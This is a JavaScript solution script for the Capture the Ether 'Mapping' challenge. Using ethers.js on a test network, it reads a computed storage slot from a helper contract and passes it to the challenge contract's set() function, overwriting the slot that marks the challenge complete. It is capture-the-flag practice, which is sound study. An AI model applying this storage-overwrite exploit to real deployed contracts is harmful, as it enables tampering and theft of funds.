/*
 * @Author: Soingjeang
 * @Date: 2022-07-25 14:04:48
 * @LastEditors: SoingJeang
 * @LastEditTime: 2022-07-25 18:52:58
 * @FilePath: \CapTheEther\src\math\3_4_MappingChallenge.js
 */
/*
 * @Author: Soingjeang
 * @Date: 2022-07-25 14:04:48
 * @LastEditors: SoingJeang
 * @LastEditTime: 2022-07-25 18:46:43
 * @FilePath: \CapTheEther\src\math\3_4_MappingChallenge.js
 */
const ethers = require('ethers');
const fs = require('fs');
const utils = require('../utils')
const abiFile = './build/contracts/MappingChallenge.json'; // fill
const ctfAbi = './build/contracts/CTFMappingChallenge.json'; // fill
const secrteFile = "../.secret"
const mnemonicFile = "../iBpnG3uuUwI.csv"
const ctfaddress = "0x302eF9D4750D2b249bA8712cab2af95e202710e5" // fill
const contractChallangeAddress = "0xc64BE6339C8Fc86C0ebE989dC7a0B9470794cFED" // fill

let provider = utils.getNetProvider("3")


async function guess(contractCtf, contractChallenge) {
    nMax = await contractCtf.getSlot(1);
    console.log("max: " + nMax)
    
    comp = await contractChallenge.isComplete()
    console.log("complete: " + comp)
    if (!comp) {
        numslot = 0
        await contractChallenge.set(nMax, 1)
        await utils.sleep(5000)
        console.log("set success in: " + nMax)
    }
    
    comp = await contractChallenge.isComplete()
    console.log("complete: " + comp)
    console.log("uess me success")
}

async function doCapture() {

    let wallet = utils.getMnemonicWallet(mnemonicFile)

    let contractChall = utils.getContract(wallet, abiFile, contractChallangeAddress, provider)
    let contrateCtf = utils.getContract(wallet, ctfAbi, ctfaddress, provider)
    // console.log(contract)
    
    guess(contrateCtf, contractChall)
}

doCapture()